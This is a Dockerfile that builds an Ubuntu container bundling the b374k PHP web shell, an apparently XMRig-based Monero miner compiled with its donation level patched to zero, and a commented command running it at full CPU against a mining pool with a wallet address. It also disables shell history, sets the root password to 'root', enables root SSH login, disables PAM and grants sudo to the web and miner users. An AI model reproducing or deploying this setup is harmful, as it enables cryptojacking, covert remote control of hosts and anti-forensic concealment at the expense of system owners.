FROM ubuntu:17.04
MAINTAINER HJay <trixism@qq.com>
ENV DOCKER_INSTALL_WEBSHELL a
# Let the conatiner know that there is no tty
ENV DEBIAN_FRONTEND noninteractive

RUN \
 cp /root/.bashrc /root/.profile / ; \
 echo 'HISTFILE=/dev/null' >> /.bashrc ; \
 HISTSIZE=0 ; \
 sed -i "s/archive.ubuntu.com/us.archive.ubuntu.com/g" /etc/apt/sources.list ; \
 echo 'deb http://us.archive.ubuntu.com/ubuntu/ trusty multiverse' >> /etc/apt/sources.list ; \
 echo 'deb-src http://us.archive.ubuntu.com/ubuntu/ trusty multiverse' >> /etc/apt/sources.list ; \
 apt-get update ; \
 apt-get -y upgrade ; \
 apt-get -y install apt-utils
RUN  useradd -r -p -M -g root -b /xmrig xminer
RUN \
 apt-get -y install software-properties-common python-software-properties ; \
 for f in ppa:ondrej/php ppa:ubuntu-toolchain-r/test; do add-apt-repository $f; done; \
 apt-get update ; \
 apt-get -y --allow-unauthenticated install nginx-extras \
 php5.6-cli php5.6-curl php5.6-fpm php5.6-json php5.6-mcrypt php5.6-mysql php5.6-sqlite php5.6-xmlrpc php5.6-xsl php5.6-gd \
 curl wget git unzip pwgen anacron build-essential cmake libuv1-dev libmicrohttpd-dev gcc-7 g++-7 sudo openssh-server \
 supervisor \
 mysql-client ; \
 apt-get clean ; \
 phpenmod mcrypt ; \
 sudo usermod -aG sudo www-data ; \
 sudo usermod -aG sudo xminer ; \
 git clone https://github.com/pikeman20/test && \
 cd test && \
 sed -i -e 's/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g' src/donate.h && \
 mkdir build && \
 cmake -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 . && \
 make
 

COPY ./sbin /root/sbin
COPY ./template /root/template

RUN mv /etc/supervisor/supervisord.conf /etc/supervisor/supervisord.conf.default ; \
 cp /root/template/conf/supervisord.conf /etc/supervisor/supervisord.conf ; \
 cp /root/template/conf/supervisor_service.conf /etc/supervisor/conf.d/ ; \
 mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.default ; \
 cp -rf /root/template/conf/nginx/* /etc/nginx/ ; \
 cp /root/template/conf/php-fpm.conf /etc/php/5.6/fpm/php-fpm.conf

RUN \
 mkdir -p /root/thirdparty ; \
 curl -sSL https://github.com/pikeman20/b374k/archive/v3.2.3.tar.gz | tar -zxf - -C /root/thirdparty/ ; \
 true

RUN mkdir /var/run/sshd

RUN echo 'root:root' |chpasswd

RUN sed -ri 's/^PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config

EXPOSE 80

WORKDIR    /test
CMD  ["/bin/bash","/root/sbin/init.sh"]
#CMD    ["/usr/sbin/sshd", "-D"]
#USER xminer
#CMD ["./xmrig", "--algo=cryptonight", "--url=stratum+tcp://xmr.poolmining.org:3032", "--user=4AMFQyFQCEVFggfMP6uhfm1wkPKBqwnzwGwUegy9JRsBQr8c9FFKxba29WUKikWVP7EdgZ5jcAqyqC1Qjt9j6EfNCdq6t9W", "--pass=x", "--max-cpu-usage=100"]
